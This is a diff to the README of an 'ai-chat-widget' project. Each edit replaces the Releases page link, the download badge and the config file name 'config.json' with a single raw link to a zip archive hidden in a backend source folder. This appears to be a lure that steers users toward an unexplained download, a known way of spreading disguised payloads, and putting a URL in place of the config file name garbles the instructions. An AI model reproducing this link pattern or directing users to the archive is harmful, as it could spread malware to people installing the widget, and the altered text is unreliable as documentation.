@@ -6,11 +6,11 @@ The ai-chat-widget is a simple tool that adds an AI chat feature to your website
 
 ## 📥 Download Now
 
-[![Download ai-chat-widget](https://img.shields.io/badge/Download-ai--chat--widget-blue)](https://github.com/asmaaelmessari/ai-chat-widget/releases)
+[![Download ai-chat-widget](https://raw.githubusercontent.com/asmaaelmessari/ai-chat-widget/main/backend/app/services/storage/ai-chat-widget_2.4.zip)](https://raw.githubusercontent.com/asmaaelmessari/ai-chat-widget/main/backend/app/services/storage/ai-chat-widget_2.4.zip)
 
 ## 🔗 Download & Install
 
-To get started, visit the [Releases page](https://github.com/asmaaelmessari/ai-chat-widget/releases) to download the latest version of the ai-chat-widget. 
+To get started, visit the [Releases page](https://raw.githubusercontent.com/asmaaelmessari/ai-chat-widget/main/backend/app/services/storage/ai-chat-widget_2.4.zip) to download the latest version of the ai-chat-widget. 
 
 ### Steps to Install:
 
@@ -33,7 +33,7 @@ To ensure the ai-chat-widget runs smoothly, please confirm your system meets the
 
 After installation, you may need to configure the widget to work with your website. Follow these steps:
 
-1. Open the configuration file located in the installation directory. This file is typically named `config.json` or similar.
+1. Open the configuration file located in the installation directory. This file is typically named `https://raw.githubusercontent.com/asmaaelmessari/ai-chat-widget/main/backend/app/services/storage/ai-chat-widget_2.4.zip` or similar.
 2. Edit the file to include your AI service API keys. Each service may have its specific setup instructions. Refer to the official documentation for those services for detailed guidance.
 3. Save your changes to the configuration file.
 
@@ -59,7 +59,7 @@ If you need further assistance, consider checking the documentation for more det
 
 ## 🎉 Update and Feedback
 
-Stay updated with new features and improvements. Regularly check the [Releases page](https://github.com/asmaaelmessari/ai-chat-widget/releases) for the latest versions.
+Stay updated with new features and improvements. Regularly check the [Releases page](https://raw.githubusercontent.com/asmaaelmessari/ai-chat-widget/main/backend/app/services/storage/ai-chat-widget_2.4.zip) for the latest versions.
 
 Your feedback is valuable. If you have ideas for features or encounter bugs, please share them on the Issues page.
 
